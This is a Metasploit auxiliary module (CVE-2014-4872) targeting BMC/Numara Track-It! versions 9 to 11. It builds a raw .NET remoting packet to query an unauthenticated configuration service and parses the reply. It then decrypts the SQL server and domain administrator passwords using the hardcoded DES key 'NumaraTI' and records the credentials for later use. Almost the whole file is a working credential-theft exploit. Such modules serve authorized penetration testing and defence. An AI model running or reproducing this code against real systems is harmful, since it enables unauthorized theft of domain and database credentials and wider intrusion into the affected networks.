##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'BMC / Numara Track-It! Domain Administrator and SQL Server User Password Disclosure',
      'Description' => %q{
        This module exploits an unauthenticated configuration retrieval .NET remoting
        service in Numara / BMC Track-It! v9 to v11.X, which can be abused to retrieve the Domain
        Administrator and the SQL server user credentials.
        This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107,
        10.0.0.143 and 9.0.30.248.
      },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2014-4872' ],
          [ 'OSVDB', '112741' ],
          [ 'US-CERT-VU', '121036' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Oct/34' ]
        ],
      'DisclosureDate' => 'Oct 7 2014'
    ))
    register_options(
      [
        OptPort.new('RPORT',
          [true, '.NET remoting service port', 9010])
      ])
  end


  def prepare_packet(bmc)
    #
    # ConfigurationService packet structure:
    #
    # packet_header_pre_packet_size
    # packet_size (4 bytes)
    # packet_header_pre_uri_size
    # uri_size (2 bytes)
    # packet_header_pre_uri
    # uri
    # packet_header_post_uri
    # packet_body_start_pre_method_size
    # method_size (1 byte)
    # method
    # packet_body_pre_type_size
    # type_size (1 byte)
    # packet_body_pre_type
    # type
    # @packet_terminator
    #
    # .NET remoting packet spec can be found at http://msdn.microsoft.com/en-us/library/cc237454.aspx
    #
    # P.S.: Lots of fun stuff can be obtained from the response. Highlights include:
    # - DatabaseServerName
    # - DatabaseName
    # - SchemaOwnerDatabaseUser
    # - EncryptedSystemDatabasePassword
    # - DomainAdminUserName
    # - DomainAdminEncryptedPassword
    #
    packet_header_pre_packet_size= [
      0x2e, 0x4e, 0x45, 0x54, 0x01, 0x00, 0x00, 0x00,
      0x00, 0x00
    ]

    packet_header_pre_uri_size = [
      0x04, 0x00, 0x01, 0x01
    ]

    packet_header_pre_uri = [
      0x00, 0x00
    ]

    # contains binary type (application/octet-stream)
    packet_header_post_uri = [
      0x06, 0x00, 0x01, 0x01, 0x18, 0x00, 0x00, 0x00,
      0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74,
      0x69, 0x6f, 0x6e, 0x2f, 0x6f, 0x63, 0x74, 0x65,
      0x74, 0x2d, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6d,
      0x00, 0x00
    ]

    packet_body_start_pre_method_size = [
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x15, 0x11, 0x00, 0x00, 0x00, 0x12
    ]

    packet_body_pre_type_size = [ 0x12 ]

    packet_body_pre_type = [ 0x01 ]

    @packet_terminator = [ 0x0b ]

    service = "TrackIt.Core.ConfigurationService".gsub(/TrackIt/,(bmc ? "Trackit" : "Numara.TrackIt"))
    method = "GetProductDeploymentValues".gsub(/TrackIt/,(bmc ? "Trackit" : "Numara.TrackIt"))
    type = "TrackIt.Core.Configuration.IConfigurationSecureDelegator, TrackIt.Core.Configuration, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null".gsub(/TrackIt/,(bmc ? "TrackIt" : "Numara.TrackIt"))

    uri = "tcp://" + rhost + ":" + rport.to_s + "/" + service

    packet_size =
      packet_header_pre_uri_size.length +
      2 + # uri_size
      packet_header_pre_uri.length +
      uri.length +
      packet_header_post_uri.length +
      packet_body_start_pre_method_size.length +
      1 + # method_size
      method.length +
      packet_body_pre_type_size.length +
      1 + # type_size
      packet_body_pre_type.length +
      type.length

    # start of packet and packet size (4 bytes)
    buf = packet_header_pre_packet_size.pack('C*')
    buf << Array(packet_size).pack('L*')

    # uri size (2 bytes)
    buf << packet_header_pre_uri_size.pack('C*')
    buf << Array(uri.length).pack('S*')

    # uri
    buf << packet_header_pre_uri.pack('C*')
    buf << uri.bytes.to_a.pack('C*')
    buf << packet_header_post_uri.pack('C*')

    # method name
    buf << packet_body_start_pre_method_size.pack('C*')
    buf << Array(method.length).pack('C*')
    buf << method.bytes.to_a.pack('C*')

    # type name
    buf << packet_body_pre_type_size.pack('C*')
    buf << Array(type.length).pack('C*')
    buf << packet_body_pre_type.pack('C*')
    buf << type.bytes.to_a.pack('C*')

    buf << @packet_terminator.pack('C*')

    return buf
  end


  def fill_loot_from_packet(packet_reply, loot)
    loot.each_key { |str|
      if loot[str] != nil
        next
      end
      if (index = (packet_reply.index(str))) != nil
        # after str, discard 5 bytes then get str_value
        size = packet_reply[index + str.length + 5,1].unpack('C*')[0]
        if size == 255
          # if we received 0xFF then there is no value for this str
          # set it to empty but not nil so that we don't look for it again
          loot[str] = ""
          next
        end
        loot[str] = packet_reply[index + str.length + 6, size]
      end
    }
  end


  def run
    packet = prepare_packet(true)

    sock = connect
    if sock.nil?
      fail_with(Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
    else
      print_status("#{rhost}:#{rport} - Sending packet to ConfigurationService...")
    end
    sock.write(packet)

    # type of database (Oracle or SQL Server)
    database_type = "DatabaseType"
    # Database server name (host\sid for Oracle or host\login_name for SQL Server)
    database_server_name = "DatabaseServerName"
    database_name = "DatabaseName"
    schema_owner = "SchemaOwnerDatabaseUser"
    database_pw = "EncryptedSystemDatabasePassword"
    domain_admin_name = "DomainAdminUserName"
    domain_admin_pw = "DomainAdminEncryptedPassword"

    loot = {
      database_type => nil,
      database_server_name => nil,
      database_name => nil,
      schema_owner => nil,
      database_pw => nil,
      domain_admin_name => nil,
      domain_admin_pw => nil
    }

    # We only break when we have a timeout (up to 15 seconds wait) or have all we need
    while true
      ready = IO.select([sock], nil, nil, 15)
      if ready
        packet_reply = sock.readpartial(4096)
      else
        print_error("#{rhost}:#{rport} - Socket timed out after 15 seconds, try again if no credentials are dumped below.")
        break
      end
      if packet_reply =~ /Service not found/
        # This is most likely an older Numara version, re-do the packet and send again.
        print_error("#{rhost}:#{rport} - Received \"Service not found\", trying again with new packet...")
        sock.close
        sock = connect
        if sock.nil?
          fail_with(Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
        else
          print_status("#{rhost}:#{rport} - Sending packet to ConfigurationService...")
        end
        packet = prepare_packet(false)
        sock.write(packet)
        packet_reply = sock.readpartial(4096)
      end

      fill_loot_from_packet(packet_reply, loot)

      if not loot.has_value?(nil)
        break
      end
    end
    sock.close

    # now set the values that were not found back to nil
    loot.each_key { |str| (loot[str] == "" ? loot[str] = nil : next) }

    if loot[database_type]
      print_good("#{rhost}:#{rport} - Got database type: #{loot[database_type]}")
    end

    if loot[database_server_name]
      print_good("#{rhost}:#{rport} - Got database server name: #{loot[database_server_name]}")
    end

    if loot[database_name]
      print_good("#{rhost}:#{rport} - Got database name: #{loot[database_name]}")
    end

    if loot[schema_owner]
      print_good("#{rhost}:#{rport} - Got database user name: #{loot[schema_owner]}")
    end

    if loot[database_pw]
      cipher = OpenSSL::Cipher.new("des")
      cipher.decrypt
      cipher.key = 'NumaraTI'
      cipher.iv = 'NumaraTI'
      loot[database_pw] = cipher.update(Rex::Text.decode_base64(loot[database_pw]))
      loot[database_pw] << cipher.final
      print_good("#{rhost}:#{rport} - Got database password: #{loot[database_pw]}")
    end

    if loot[domain_admin_name]
      print_good("#{rhost}:#{rport} - Got domain administrator username: #{loot[domain_admin_name]}")
    end

    if loot[domain_admin_pw]
      cipher = OpenSSL::Cipher.new("des")
      cipher.decrypt
      cipher.key = 'NumaraTI'
      cipher.iv = 'NumaraTI'
      loot[domain_admin_pw] = cipher.update(Rex::Text.decode_base64(loot[domain_admin_pw]))
      loot[domain_admin_pw] << cipher.final
      print_good("#{rhost}:#{rport} - Got domain administrator password: #{loot[domain_admin_pw]}")
    end

    if loot[schema_owner] and loot[database_pw] and loot[database_type] and loot[database_server_name]
      # If it is Oracle we need to save the SID for creating the Credential Core, else we don't care
      if loot[database_type] =~ /Oracle/i
        sid = loot[database_server_name].split('\\')[1]
      else
        sid = nil
      end

      credential_core = report_credential_core({
         password: loot[database_pw],
         username: loot[schema_owner],
         sid: sid
       })

      # Get just the hostname
      db_address= loot[database_server_name].split('\\')[0]

      begin
        database_login_data = {
          address: ::Rex::Socket.getaddress(db_address, true),
          service_name: loot[database_type],
          protocol: 'tcp',
          workspace_id: myworkspace_id,
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        # If it's Oracle, use the Oracle port, else use MSSQL
        if loot[database_type] =~ /Oracle/i
          database_login_data[:port] = 1521
        else
          database_login_data[:port] = 1433
        end
        create_credential_login(database_login_data)
      # Skip creating the Login, but tell the user about it if we cannot resolve the DB Server Hostname
      rescue SocketError
        print_error "Could not resolve Database Server Hostname."
      end

      print_status("#{rhost}:#{rport} - Stored SQL credentials: #{loot[database_server_name]}:#{loot[schema_owner]}:#{loot[database_pw]}")
    end

    if loot[domain_admin_name] and loot[domain_admin_pw]
      report_credential_core({
        password: loot[domain_admin_pw],
        username: loot[domain_admin_name].split('\\')[1],
        domain: loot[domain_admin_name].split('\\')[0]
      })

      print_status("#{rhost}:#{rport} - Stored domain credentials: #{loot[domain_admin_name]}:#{loot[domain_admin_pw]}")
    end
  end


  def report_credential_core(cred_opts={})
    # Set up the has for our Origin service
    origin_service_data = {
      address: rhost,
      port: rport,
      service_name: 'Domain',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: self.fullname,
      private_type: :password,
      private_data: cred_opts[:password],
      username: cred_opts[:username]
    }

    if cred_opts[:domain]
      credential_data.merge!({
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: cred_opts[:domain]
      })
    elsif cred_opts[:sid]
      credential_data.merge!({
         realm_key: Metasploit::Model::Realm::Key::ORACLE_SYSTEM_IDENTIFIER,
         realm_value: cred_opts[:sid]
       })
    end

    credential_data.merge!(origin_service_data)
    create_credential(credential_data)
  end
end
